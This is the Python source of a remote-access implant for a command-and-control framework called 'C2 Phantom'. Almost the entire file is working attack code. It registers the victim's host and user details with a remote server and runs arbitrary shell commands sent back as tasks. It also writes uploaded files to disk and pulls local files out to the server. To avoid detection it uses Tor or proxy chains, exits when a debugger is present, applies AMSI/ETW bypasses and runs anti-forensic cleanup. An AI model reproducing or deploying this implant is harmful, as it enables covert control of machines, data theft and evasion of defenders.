"""
C2 Agent/Implant for C2 Phantom.

This is the agent that runs on target systems and communicates with the C2 server.
Includes military-grade OPSEC: anonymity, evasion, anti-forensics.
"""

import asyncio
import json
import platform
import subprocess
import sys
from typing import Dict, Any, Optional
from datetime import datetime
import getpass
import socket
import logging

import aiohttp

logger = logging.getLogger(__name__)


class C2Agent:
    """
    C2 Agent that runs on target system with OPSEC features.

    Registers with C2 server, receives commands, executes them, and returns results.
    Supports Tor/proxy anonymity, Windows evasion, and anti-forensics.
    """

    def __init__(
        self,
        c2_server_url: str,
        beacon_interval: int = 60,
        jitter: int = 30,
        enable_opsec: bool = True,
        proxy_config: Optional[Dict[str, Any]] = None,
    ) -> None:
        """
        Initialize C2 agent.

        Args:
            c2_server_url: C2 server URL
            beacon_interval: Beacon interval in seconds
            jitter: Random jitter to add to beacon interval
            enable_opsec: Enable OPSEC features (evasion, anti-debug, cleanup)
            proxy_config: Proxy configuration dict:
                - proxies: List of proxy URLs
                - use_tor: Boolean to use Tor
                - rotate_ua: Boolean to rotate user agents
        """
        self.c2_server_url = c2_server_url.rstrip("/")
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.session_id: Optional[str] = None
        self.encryption_key: Optional[str] = None
        self.running = False
        self.enable_opsec = enable_opsec
        self.proxy_config = proxy_config or {}
        self.anonymous_client = None

        # Initialize anonymous HTTP client if proxy config provided
        if self.proxy_config:
            try:
                from c2_phantom.network.anonymity import AnonymousClient

                self.anonymous_client = AnonymousClient(
                    proxies=self.proxy_config.get("proxies"),
                    use_tor=self.proxy_config.get("use_tor", False),
                    rotate_user_agent=self.proxy_config.get("rotate_ua", True),
                )
                logger.info("[OPSEC] Anonymous client initialized")
            except ImportError:
                logger.warning("[OPSEC] AnonymousClient not available")

        # OPSEC: Apply evasion and anti-debug checks
        if self.enable_opsec and platform.system() == "Windows":
            try:
                from c2_phantom.evasion import apply_evasion_techniques, AntiDebug

                # Check for debugger/VM/sandbox
                if AntiDebug.is_debugger_present():
                    logger.critical("[OPSEC] Debugger detected - ABORT")
                    sys.exit(1)

                if AntiDebug.check_vm_artifacts():
                    logger.warning("[OPSEC] VM detected - proceeding with caution")

                # Apply AMSI/ETW bypasses
                evasion_results = apply_evasion_techniques()
                logger.info(f"[OPSEC] Evasion applied: {evasion_results}")

            except ImportError as ie:
                logger.warning(f"[OPSEC] Evasion modules not available: {ie}")
            except Exception as e:
                logger.error(f"[OPSEC] Evasion failed: {e}")

    async def register(self) -> bool:
        """
        Register with C2 server using anonymous client if configured.

        Returns:
            True if registration successful
        """
        try:
            # Gather system information
            system_info = {
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.machine(),
                "python_version": sys.version.split()[0],
            }

            # Use anonymous client if available
            if self.anonymous_client:
                response_data = await self.anonymous_client.post(f"{self.c2_server_url}/register", json=system_info)
                self.session_id = response_data["session_id"]
                self.encryption_key = response_data.get("encryption_key")
                self.beacon_interval = response_data.get("beacon_interval", self.beacon_interval)
                self.jitter = response_data.get("jitter", self.jitter)
                print(f"[+] Registered with C2 server (anonymous), session ID: {self.session_id}")
                return True
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.c2_server_url}/register",
                        json=system_info,
                        ssl=False,
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            self.session_id = data["session_id"]
                            self.encryption_key = data.get("encryption_key")
                            self.beacon_interval = data.get("beacon_interval", self.beacon_interval)
                            self.jitter = data.get("jitter", self.jitter)
                            print(f"[+] Registered with C2 server, session ID: {self.session_id}")
                            return True
                        else:
                            print(f"[-] Registration failed: {response.status}")
                            return False

        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False

    async def beacon(self) -> Dict[str, Any]:
        """
        Send beacon to C2 server using anonymous client.

        Returns:
            Beacon response data
        """
        try:
            if self.anonymous_client:
                return await self.anonymous_client.post(
                    f"{self.c2_server_url}/beacon", json={"session_id": self.session_id}
                )
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.c2_server_url}/beacon", json={"session_id": self.session_id}, ssl=False
                    ) as response:
                        if response.status == 200:
                            return await response.json()
                        else:
                            print(f"[-] Beacon failed: {response.status}")
                            return {}

        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return {}

    async def get_tasks(self) -> list:
        """
        Retrieve tasks from C2 server using anonymous client.

        Returns:
            List of tasks to execute
        """
        try:
            if self.anonymous_client:
                data = await self.anonymous_client.get(f"{self.c2_server_url}/tasks/{self.session_id}")
                return data.get("tasks", [])
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"{self.c2_server_url}/tasks/{self.session_id}", ssl=False) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("tasks", [])
                        else:
                            return []

        except Exception as e:
            print(f"[-] Get tasks error: {e}")
            return []

    async def execute_command(self, command: str) -> Dict[str, Any]:
        """
        Execute a shell command.

        Args:
            command: Command to execute

        Returns:
            Execution result
        """
        try:
            # Determine shell based on platform
            if platform.system() == "Windows":
                shell_cmd = ["powershell.exe", "-Command", command]
            else:
                shell_cmd = ["/bin/bash", "-c", command]

            # Execute command
            process = subprocess.Popen(shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout

            return {
                "output": stdout,
                "error": stderr,
                "exit_code": process.returncode,
                "timestamp": datetime.now().isoformat(),
            }

        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "output": "",
                "error": "Command timed out after 5 minutes",
                "exit_code": -1,
                "timestamp": datetime.now().isoformat(),
            }
        except Exception as e:
            return {"output": "", "error": str(e), "exit_code": -1, "timestamp": datetime.now().isoformat()}

    async def post_results(self, task_id: str, results: Dict[str, Any]) -> bool:
        """
        Post command results back to C2 server using anonymous client.

        Args:
            task_id: Task ID
            results: Execution results

        Returns:
            True if successful
        """
        try:
            data = {"task_id": task_id, **results}

            if self.anonymous_client:
                await self.anonymous_client.post(f"{self.c2_server_url}/results/{self.session_id}", json=data)
                return True
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.c2_server_url}/results/{self.session_id}", json=data, ssl=False
                    ) as response:
                        return response.status == 200

        except Exception as e:
            print(f"[-] Post results error: {e}")
            return False

    async def upload_file(self, remote_path: str, file_data_b64: str) -> Dict[str, Any]:
        """
        Write uploaded file to disk.

        Args:
            remote_path: Path where to write file
            file_data_b64: Base64 encoded file data

        Returns:
            Upload result
        """
        try:
            import base64
            from pathlib import Path

            # Decode base64 data
            file_data = base64.b64decode(file_data_b64)

            # Create directory if needed
            Path(remote_path).parent.mkdir(parents=True, exist_ok=True)

            # Write file
            with open(remote_path, "wb") as f:
                f.write(file_data)

            return {
                "status": "success",
                "path": remote_path,
                "size": len(file_data),
                "timestamp": datetime.now().isoformat(),
            }

        except Exception as e:
            return {"status": "error", "error": str(e), "timestamp": datetime.now().isoformat()}

    async def download_file(self, local_path: str) -> Dict[str, Any]:
        """
        Read file from disk and encode for download.

        Args:
            local_path: Path to file to download

        Returns:
            Download result with base64 encoded data
        """
        try:
            import base64
            from pathlib import Path

            file_path = Path(local_path)

            if not file_path.exists():
                return {"status": "error", "error": "File not found", "timestamp": datetime.now().isoformat()}

            # Read and encode file
            with open(file_path, "rb") as f:
                file_data = f.read()

            encoded_data = base64.b64encode(file_data).decode()

            return {
                "status": "success",
                "data": encoded_data,
                "filename": file_path.name,
                "size": len(file_data),
                "timestamp": datetime.now().isoformat(),
            }

        except Exception as e:
            return {"status": "error", "error": str(e), "timestamp": datetime.now().isoformat()}

    async def process_task(self, task: Dict[str, Any]) -> None:
        """
        Process a single task.

        Args:
            task: Task to process
        """
        task_id = task.get("id")
        task_type = task.get("type")

        print(f"[*] Processing task {task_id}: {task_type}")

        if task_type == "execute":
            command = task.get("command")
            if command:
                print(f"[*] Executing: {command}")
                results = await self.execute_command(command)
                await self.post_results(task_id, results)
                print(f"[+] Task {task_id} completed")

        elif task_type == "upload":
            remote_path = task.get("remote_path")
            file_data = task.get("data")
            if remote_path and file_data:
                print(f"[*] Uploading file to: {remote_path}")
                results = await self.upload_file(remote_path, file_data)
                await self.post_results(task_id, results)
                print(f"[+] Upload completed: {remote_path}")
            else:
                print(f"[!] Invalid upload task data")

        elif task_type == "download":
            local_path = task.get("path")
            if local_path:
                print(f"[*] Downloading file from: {local_path}")
                results = await self.download_file(local_path)
                await self.post_results(task_id, results)
                print(f"[+] Download completed: {local_path}")
            else:
                print(f"[!] Invalid download task data")

        else:
            print(f"[!] Unknown task type: {task_type}")

    async def run(self) -> None:
        """
        Main agent loop with OPSEC cleanup.

        Continuously beacons to C2 server, retrieves tasks, and executes them.
        Performs emergency cleanup on shutdown.
        """
        try:
            # Register with C2 server
            if not await self.register():
                print("[-] Failed to register with C2 server")
                return

            self.running = True
            print(f"[+] Agent started (beacon interval: {self.beacon_interval}s, jitter: {self.jitter}s)")

            while self.running:
                try:
                    # Send beacon
                    beacon_response = await self.beacon()

                    # Check if there are tasks
                    if beacon_response.get("has_tasks"):
                        tasks = await self.get_tasks()

                        for task in tasks:
                            await self.process_task(task)

                    # Sleep with jitter
                    import random

                    sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                    sleep_time = max(10, sleep_time)  # Minimum 10 seconds

                    await asyncio.sleep(sleep_time)

                except KeyboardInterrupt:
                    print("\n[*] Agent stopped by user")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Agent error: {e}")
                    await asyncio.sleep(self.beacon_interval)

        finally:
            # Emergency cleanup on shutdown
            if self.enable_opsec:
                print("[*] Performing emergency cleanup...")
                from c2_phantom.core.antiforensics import SelfDestruct

                SelfDestruct.emergency_cleanup()

    def stop(self) -> None:
        """Stop the agent and perform emergency cleanup."""
        self.running = False
        if self.enable_opsec:
            print("[*] Performing emergency cleanup...")
            from c2_phantom.core.antiforensics import SelfDestruct

            SelfDestruct.emergency_cleanup()


def main():
    """Main entry point for agent."""
    import argparse

    parser = argparse.ArgumentParser(description="C2 Phantom Agent with OPSEC")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://localhost:8443)")
    parser.add_argument("--beacon", type=int, default=60, help="Beacon interval in seconds")
    parser.add_argument("--jitter", type=int, default=30, help="Beacon jitter in seconds")
    parser.add_argument("--tor", action="store_true", help="Use Tor for anonymity")
    parser.add_argument("--proxy", type=str, help="SOCKS5 proxy URL (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--proxy-chain", nargs="+", help="List of proxy URLs to chain")
    parser.add_argument("--rotate-ua", action="store_true", help="Rotate user agents")
    parser.add_argument("--no-opsec", action="store_true", help="Disable OPSEC features")

    args = parser.parse_args()

    # Build proxy config
    proxy_config = None
    if not args.no_opsec:
        proxies = []
        if args.proxy_chain:
            proxies = args.proxy_chain
        elif args.proxy:
            proxies = [args.proxy]

        proxy_config = {
            "proxies": proxies,
            "use_tor": args.tor,
            "rotate_ua": args.rotate_ua or len(proxies) > 0,
        }

    agent = C2Agent(args.server, args.beacon, args.jitter, enable_opsec=not args.no_opsec, proxy_config=proxy_config)

    try:
        asyncio.run(agent.run())
    except KeyboardInterrupt:
        print("\n[*] Agent stopped")


if __name__ == "__main__":
    main()
